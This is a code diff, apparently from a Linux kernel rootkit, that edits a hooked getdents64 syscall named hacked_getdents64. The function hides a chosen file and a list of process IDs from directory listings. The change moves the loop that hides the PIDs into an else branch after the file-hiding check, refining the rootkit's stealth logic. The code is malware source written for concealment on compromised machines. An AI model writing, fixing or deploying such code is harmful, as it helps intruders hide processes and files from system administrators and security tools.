@@ -111,18 +111,6 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 			n = dirp3->d_reclen;
 			t -= n;
 			int i;
-			for(i = 0; i < index; i++){
-				if(strstr((char*) &(dirp3->d_name), hidden_PIDs[i]) != NULL){
-                                	if (t != 0){
-                                	        memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
-                                	}
-                                	else{
-                                	        dirp3->d_off = 1024;
-                                	}
-                                		tmp -=n;
-                        	}
-			}
-
 			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
 				if (t != 0){
 					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
@@ -132,6 +120,20 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 				}
 				tmp -=n;
 			}
+			else{
+                        	for(i = 0; i < index; i++){
+                        	        if(strstr((char*) &(dirp3->d_name), hidden_PIDs[i]) != NULL){
+                        	                if (t != 0){
+                        	                        memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
+                        	                }
+                        	                else{
+                        	                        dirp3->d_off = 1024;
+                        	                }
+                        	                        tmp -=n;
+                        	        }
+                        	}
+			}
+
 			if (t != 0){
 				dirp3 = (struct linux_dirent64 *) ((char *) dirp3 + dirp3->d_reclen);
 			}
